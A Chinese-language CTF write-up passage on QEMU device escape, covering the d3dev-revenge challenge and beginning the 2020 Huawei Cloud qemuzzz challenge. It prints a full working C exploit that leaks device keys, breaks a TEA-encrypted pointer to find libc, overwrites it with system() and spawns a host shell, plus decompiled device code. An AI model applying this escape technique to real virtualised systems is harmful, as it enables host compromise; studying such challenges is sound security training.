<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span></span><br><span class="line">0x00000000febf1000 0x00000000febf17ff 0x0000000000040200</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这一步就是将其映射出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open and map I/O memory for the d3dev device</span></span><br><span class="line"><span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line"><span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">   die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br></pre></td></tr></table></figure>
<p>接着程序就可以通过操作mmio_mem来进行mmio操作</p>
<p>pmio要先申请权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line"><span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    die(<span class="string">"I/O permission is not enough"</span>);</span><br></pre></td></tr></table></figure>
<p>之后就可以根据base进行pmio请求了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0x000000000000c040</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_arbread(<span class="keyword">uint32_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>b w l分别是size 为8 16 32</p>
<h4 id="exp调试"><a href="#exp调试" class="headerlink" title="exp调试"></a>exp调试</h4><p>因为rootfs是img后缀，不过其算伪img(因为死活挂载不上去)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@ubuntu:~/qemu/d3dev-revenge_attachment/docker_attachment_revenge/bin$ file rootfs.img </span><br><span class="line">rootfs.img: <span class="function">ASCII cpio <span class="title">archive</span> <span class="params">(SVR4 with no CRC)</span></span></span><br></pre></td></tr></table></figure>
<p>可以修改后缀为cpio，然后解压之后把poc放进去，再用kernel pwn的cpio脚本重新打包回去</p>
<p>exp的编译选项</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -O0 -<span class="keyword">static</span> -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</span><br></pre></td></tr></table></figure>
<p>exp 中tea加解密部分划分了大量的时间，因为在加密完成后，把两个32位数拼成64位时，我一开始写的是res &lt;&lt; 0x20 + v0，因为+优先级比&lt;&lt;高，所以算错了，这里调了半天。。。。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> res = v1;                                        <span class="comment">/* end cycle */</span></span><br><span class="line"><span class="keyword">return</span> (res&lt;&lt;<span class="number">0x20</span>) + v0;</span><br></pre></td></tr></table></figure>
<p>最终gdb调试是可以正常执行到sh的，然后实际在系统中测试是这个样,（参考最后system的问题）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sh: turning off NDELAY mode</span><br></pre></td></tr></table></figure>
<p>完整exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key0 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key3 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> encrypt (<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"test_encrpt v0: 0x%llx\n"</span>,v0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"test_encrpt v1: 0x%llx\n"</span>,v1);</span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"test_encrpt k0: 0x%llx\n"</span>,k0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"test_encrpt k0: 0x%llx\n"</span>,k1);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        <span class="comment">//printf("test_encrpt round: 0x%llx,0x%llx,0x%llx\n",i,v0,v1);</span></span><br><span class="line">         </span><br><span class="line">    &#125;      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"test_encrpt round: 0x%llx,0x%llx\n"</span>,v0,v1);</span><br><span class="line">    <span class="keyword">uint64_t</span> res = v1;                                        <span class="comment">/* end cycle */</span></span><br><span class="line">    <span class="keyword">return</span> (res&lt;&lt;<span class="number">0x20</span>) + v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> decrypt (<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"test_decrpt round: 0x%llx,0x%llx\n"</span>,v0,v1);                  <span class="comment">/* end cycle */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> res = v1;                                        <span class="comment">/* end cycle */</span></span><br><span class="line">    <span class="keyword">return</span> (res&lt;&lt;<span class="number">0x20</span>) + v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_write(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">    outl(value,pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Open and map I/O memory for the d3dev device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">        <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    <span class="comment">//set seek = 0x100</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">//read key</span></span><br><span class="line">    key0 = pmio_read(<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rand0: 0x%lx\n"</span>,key0);</span><br><span class="line">    key1 = pmio_read(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rand1: 0x%lx\n"</span>,key1);</span><br><span class="line">    key2 = pmio_read(<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rand2: 0x%lx\n"</span>,key2);</span><br><span class="line">    key3 = pmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rand3: 0x%lx\n"</span>,key3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint64_t test_num = 0x1234567812345678;</span></span><br><span class="line">    <span class="comment">// uint64_t res = encrypt((uint32_t*)&amp;test_num,(uint32_t*)&amp;key0);</span></span><br><span class="line">    <span class="comment">// printf("test_encrpt: 0x%llx\n",res);</span></span><br><span class="line">    <span class="comment">// //0x7bff9e629cb5b31a</span></span><br><span class="line">    <span class="comment">// mmio_write(0,0x12345678);</span></span><br><span class="line">    <span class="comment">// mmio_write(0,0x12345678);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint32_t r_rand_lo = mmio_read(0);</span></span><br><span class="line">    <span class="comment">// uint32_t r_rand_hi = mmio_read(0);</span></span><br><span class="line">    <span class="comment">// uint64_t dec_res  = (uint64_t)(r_rand_hi&lt;&lt;0x20) +  r_rand_lo;</span></span><br><span class="line">    <span class="comment">// uint64_t r_rand_addr =  encrypt((uint32_t*)&amp;dec_res,(uint32_t*)&amp;key0);</span></span><br><span class="line">    <span class="comment">// printf("test_decrpt: 0x%llx\n",r_rand_addr);</span></span><br><span class="line">    <span class="comment">//read r_rand addr</span></span><br><span class="line">    <span class="keyword">uint32_t</span> r_rand_lo = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> r_rand_hi = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> r_rand_addr = r_rand_hi;</span><br><span class="line">    r_rand_addr = (r_rand_addr&lt;&lt;<span class="number">0x20</span>) + r_rand_lo;</span><br><span class="line"></span><br><span class="line">    r_rand_addr =  encrypt((<span class="keyword">uint32_t</span>*)&amp;r_rand_addr,(<span class="keyword">uint32_t</span>*)&amp;key0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rand_r addr: 0x%llx\n"</span>,r_rand_addr);</span><br><span class="line">    <span class="comment">//0x00007ffff7a13d60 - 0x00007ffff79cc000 = 0x47D60</span></span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = r_rand_addr - <span class="number">0x47D60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking libc addr: 0x%llx\n"</span>,libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = libc_base + <span class="number">0x522C0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking system addr: 0x%llx\n"</span>,system_addr);</span><br><span class="line">    <span class="comment">//overwrite r_rand</span></span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr_dec =  decrypt((<span class="keyword">uint32_t</span>*)&amp;system_addr,(<span class="keyword">uint32_t</span>*)&amp;key0);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr_recover =  encrypt((<span class="keyword">uint32_t</span>*)&amp;system_addr_dec,(<span class="keyword">uint32_t</span>*)&amp;key0);</span><br><span class="line">    <span class="comment">//printf("leaking system_addr_recover addr: 0x%llx\n",system_addr_recover);</span></span><br><span class="line">    <span class="comment">//c</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking system_addr_dec_lo: 0x%llx\n"</span>,(<span class="keyword">uint32_t</span>)system_addr_dec);</span><br><span class="line">    <span class="comment">//printf("leaking system_addr_dec_hi: 0x%llx\n",((uint32_t*)&amp;system_addr_dec)[1]);</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x18</span>,((<span class="keyword">uint32_t</span>*)&amp;system_addr_dec)[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,((<span class="keyword">uint32_t</span>*)&amp;system_addr_dec)[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">12</span>] = <span class="string">"/bin/sh\n\x00\x00\x00\x00"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get shell</span></span><br><span class="line">    <span class="comment">//set seek = 0x0</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x0</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> command_dec =  decrypt((<span class="keyword">uint32_t</span>*)&amp;command[<span class="number">4</span>],(<span class="keyword">uint32_t</span>*)&amp;key0);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,(<span class="keyword">uint32_t</span>)command_dec);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,(<span class="keyword">uint32_t</span>)(command_dec&gt;&gt;<span class="number">0x20</span>));</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span>,*(<span class="keyword">uint32_t</span>*)command);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2020华为云-qemuzzz"><a href="#2020华为云-qemuzzz" class="headerlink" title="2020华为云 qemuzzz"></a>2020华为云 qemuzzz</h2><p><a href="https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020/tree/main/pwn/qemuzzz" target="_blank" rel="noopener">xctf_huaweicloud-qualifier-2020/pwn/qemuzzz at main · huaweictf/xctf_huaweicloud-qualifier-2020 (github.com)</a></p>
<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>启动脚本如下，因为wp里提供的附件没有rootfs.cpio和bzImage,所以我们得从其他题目里搬一个过来,结果发现都不不行，还是得找原始附件</p>
<p><a href="https://github.com/imemaker/CTF/blob/fdb322a19a2eb97ad15f742462d0c318fcac4168/2020/华为云CTF.md" target="_blank" rel="noopener">CTF/华为云CTF.md at fdb322a19a2eb97ad15f742462d0c318fcac4168 · imemaker/CTF (github.com)</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"><span class="comment">#gdb --args \</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kalsr'</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic \</span><br><span class="line">-device zzz \</span><br><span class="line">-L pc-bios</span><br></pre></td></tr></table></figure>
<p>所以设备名为zzz</p>
<p>可以看到其相关函数</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220430173539886.png" alt="image-20220430173539886"></p>
<p><strong>zzz_class_init</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">zzz_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = object_class_dynamic_cast_assert(</span><br><span class="line">             a1,</span><br><span class="line">             <span class="string">"pci-device"</span>,</span><br><span class="line">             <span class="string">"/opt/qemu-5.2.0/include/hw/pci/pci.h"</span>,</span><br><span class="line">             <span class="number">201L</span>L,</span><br><span class="line">             <span class="string">"PCI_DEVICE_CLASS"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_zzz_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = pci_zzz_uninit;</span><br><span class="line">  *(_DWORD *)(result + <span class="number">208</span>) = <span class="number">0x23331234</span>;       <span class="comment">// vendor</span></span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">16</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以获得vendor信息为0x23331234</p>
<p><strong>zzz_instance_init</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">zzz_instance_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = object_dynamic_cast_assert(a1, &amp;off_7CE55E, <span class="string">"../hw/misc/zzz.c"</span>, <span class="number">135L</span>L, <span class="string">"zzz_instance_init"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">0x19F0</span>) = result;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">0x19F8</span>) = cpu_physical_memory_rw;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是在+0x19F8处设置了一个函数</p>
<p><strong>pci_zzz_realize</strong></p>
